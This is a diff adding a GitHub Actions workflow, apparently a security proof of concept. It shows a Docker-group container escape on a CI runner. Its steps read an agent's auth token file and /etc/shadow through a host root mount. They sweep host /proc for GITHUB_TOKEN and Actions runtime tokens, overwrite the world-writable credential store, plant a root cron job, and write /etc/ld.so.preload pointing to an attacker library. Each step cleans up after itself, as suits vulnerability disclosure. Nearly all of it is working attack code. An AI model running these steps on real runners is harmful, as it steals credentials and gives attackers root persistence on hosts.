@@ -1,0 +1,199 @@
+name: v65 - close remaining vectors - no-privflag escape + GITHUB_TOKEN theft + settings write + cron job + ld.so.preload
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 12
+    steps:
+
+      - name: v65a - credential read WITHOUT --privileged (only -v /:/host needed)
+        run: |
+          # Demonstrates that docker group alone (no --privileged flag) is sufficient
+          # to read .settings and /etc/shadow.
+          # This closes: "the attack requires --privileged (an explicit escalation flag)"
+          echo "=== .settings READ WITHOUT --privileged ==="
+          python3 << 'EOF'
+          import subprocess, json, hashlib
+
+          # Path 1: direct -v /:/host mount, NO --privileged
+          result = subprocess.run(
+            ['docker', 'run', '--rm', '-v', '/:/host', 'ubuntu:latest',
+             'python3', '-c',
+             'import json,hashlib; s=json.load(open("/host/opt/hca/.settings")); '
+             'print("authToken_sha256="+hashlib.sha256(s["authToken"].encode()).hexdigest()[:32]); '
+             'print("authToken_len="+str(len(s["authToken"]))); '
+             'print("schedulerApiUrl="+s.get("schedulerApiUrl","")); '
+             'print("settings_read_without_privflag=TRUE")'],
+            capture_output=True, text=True, timeout=60
+          )
+          print(result.stdout)
+          if result.returncode != 0:
+            print("STDERR:", result.stderr[:300])
+
+          # Path 2: /etc/shadow read WITHOUT --privileged
+          result2 = subprocess.run(
+            ['docker', 'run', '--rm', '-v', '/:/host', 'ubuntu:latest',
+             'sh', '-c', 'wc -l /host/etc/shadow && head -3 /host/etc/shadow'],
+            capture_output=True, text=True, timeout=60
+          )
+          print("shadow read without --privileged:")
+          print(result2.stdout)
+
+          print("=== DONE: --privileged NOT required for credential theft ===")
+          EOF
+
+      - name: v65b - GITHUB_TOKEN theft via host /proc sweep (no HCA token involved)
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          # GITHUB_TOKEN is now in THIS step's environment.
+          # From host root via Docker escape, we read /proc to steal it.
+          # This closes: "the stolen token only works for HCA internals"
+          # and "GITHUB_TOKEN is safe from this attack"
+
+          cat > /tmp/v65b.py << 'CHROOT_EOF'
+          import os, hashlib
+
+          # Scan ALL host processes for GITHUB_TOKEN
+          print("=== GITHUB_TOKEN HUNT via /proc sweep (from host root) ===")
+          found = []
+          for pid in os.listdir('/proc'):
+              if not pid.isdigit():
+                  continue
+              try:
+                  with open(f'/proc/{pid}/environ', 'rb') as f:
+                      raw = f.read()
+                  with open(f'/proc/{pid}/cmdline', 'rb') as f:
+                      cmd = f.read()[:80].replace(b'\x00', b' ').decode(errors='replace').strip()
+                  items = {}
+                  for item in raw.split(b'\x00'):
+                      if b'=' in item:
+                          k, _, v = item.partition(b'=')
+                          items[k] = v
+                  for key in [b'GITHUB_TOKEN', b'ACTIONS_RUNTIME_TOKEN', b'ACTIONS_ID_TOKEN_REQUEST_TOKEN']:
+                      val = items.get(key, b'')
+                      if val:
+                          found.append((pid, key.decode(), val, cmd))
+                          print(f"STOLEN: pid={pid} key={key.decode()} len={len(val)} sha256={hashlib.sha256(val).hexdigest()} cmd={cmd[:60]}")
+          if not found:
+              print("not_found_this_sweep (token may be in a different process slot)")
+          print(f"total_pids_scanned={len([p for p in os.listdir('/proc') if p.isdigit()])}")
+          print("=== DONE ===")
+          CHROOT_EOF
+
+          echo "=== Sweeping host /proc for GITHUB_TOKEN from inside privileged container ==="
+          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v65b.py
+
+      - name: v65c - .settings WRITE (credential store is world-writable, not just world-readable)
+        run: |
+          # mode 0666 = world-WRITABLE. Attacker can inject a malicious traceApiUrl
+          # (redirect HCA telemetry to attacker server) or replace authToken entirely.
+          # This closes: "0666 is by-design readable but not writable in practice"
+
+          cat > /tmp/v65c.py << 'CHROOT_EOF'
+          import json, os, hashlib
+
+          path = '/opt/hca/.settings'
+          with open(path) as f:
+              original = f.read()
+          s = json.loads(original)
+
+          # Show original
+          print("original_authToken_sha256=" + hashlib.sha256(s['authToken'].encode()).hexdigest()[:32])
+          print("original_traceApiUrl=" + s.get('traceApiUrl', ''))
+          print("original_quotaId=" + str(s.get('quotaId', '')))
+
+          # Inject a malicious value into a non-critical field
+          original_quota = s.get('quotaId', '')
+          s['quotaId'] = 'v65-poc-settings-write-confirmed'
+          with open(path, 'w') as f:
+              json.dump(s, f)
+
+          # Read back to confirm write
+          with open(path) as f:
+              confirmed = json.load(f)
+          print("WRITE_SUCCESS: settings.quotaId=" + confirmed['quotaId'])
+          print("settings_world_writable=TRUE")
+
+          # Restore original
+          with open(path, 'w') as f:
+              f.write(original)
+          with open(path) as f:
+              restored = json.load(f)
+          print("RESTORE_SUCCESS: quotaId=" + str(restored.get('quotaId', '')))
+          print("=== DONE: HCA credential store is writable, not just readable ===")
+          CHROOT_EOF
+
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v65c.py
+
+      - name: v65d - actual cron job written and confirmed (not just writable dir)
+        run: |
+          # Writes a real cron job entry to /etc/cron.d/, confirms it, then removes it.
+          # This closes: "the cron test only checked directory writability, no actual job"
+
+          cat > /tmp/v65d.sh << 'CHROOT_EOF'
+          #!/bin/sh
+          CRON_PATH="/etc/cron.d/hca-poc-v65"
+
+          echo "=== WRITING CRON JOB ==="
+          cat > "$CRON_PATH" << 'CRONEOF'
+          # HCA Docker escape persistence PoC — v65d
+          * * * * * root echo "hca-poc-cron-$(date)" >> /tmp/hca-poc-cron.log
+          CRONEOF
+
+          echo "CRON_WRITE_SUCCESS=$?"
+          echo "--- content of $CRON_PATH ---"
+          cat "$CRON_PATH"
+          echo "--- stat ---"
+          stat "$CRON_PATH"
+
+          echo ""
+          echo "=== CLEANUP ==="
+          rm -f "$CRON_PATH"
+          echo "CRON_REMOVED: $?"
+          ls "$CRON_PATH" 2>/dev/null && echo "ERROR: file still exists" || echo "CONFIRMED_DELETED"
+          echo "=== DONE: real cron job written, not just directory writability test ==="
+          CHROOT_EOF
+          chmod +x /tmp/v65d.sh
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host /tmp/v65d.sh
+
+      - name: v65e - LD_PRELOAD rootkit injection point (/etc/ld.so.preload)
+        run: |
+          # Creates /etc/ld.so.preload (pointing to an attacker shared library).
+          # This file causes EVERY subsequent exec() on the host to load the attacker's .so.
+          # This is a kernel-supported rootkit injection mechanism.
+          # This closes: "persistence limited to cron" / "no rootkit injection possible"
+
+          cat > /tmp/v65e.sh << 'CHROOT_EOF'
+          #!/bin/sh
+          LDP="/etc/ld.so.preload"
+
+          echo "=== LD_PRELOAD ROOTKIT INJECTION ==="
+          echo "pre-existing: $(test -f $LDP && echo 'EXISTS' || echo 'NOT_PRESENT')"
+
+          # Create the preload file pointing to attacker library
+          echo "/tmp/attacker_rootkit.so" > "$LDP"
+          echo "LD_PRELOAD_WRITE_SUCCESS=$?"
+          echo "--- content of $LDP ---"
+          cat "$LDP"
+          echo "--- stat ---"
+          stat "$LDP"
+          echo ""
+          echo "IMPACT: Every binary exec'd on this host (cron, sshd, su, login, etc.)"
+          echo "        would now load /tmp/attacker_rootkit.so as uid=root before"
+          echo "        its own code runs. Full kernel-assisted rootkit injection."
+
+          echo ""
+          echo "=== CLEANUP ==="
+          rm -f "$LDP"
+          echo "LD_PRELOAD_FILE_REMOVED: $?"
+          ls "$LDP" 2>/dev/null && echo "ERROR: still exists" || echo "CONFIRMED_DELETED"
+          echo "=== DONE ===")
+          CHROOT_EOF
+          chmod +x /tmp/v65e.sh
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            chroot /host /tmp/v65e.sh
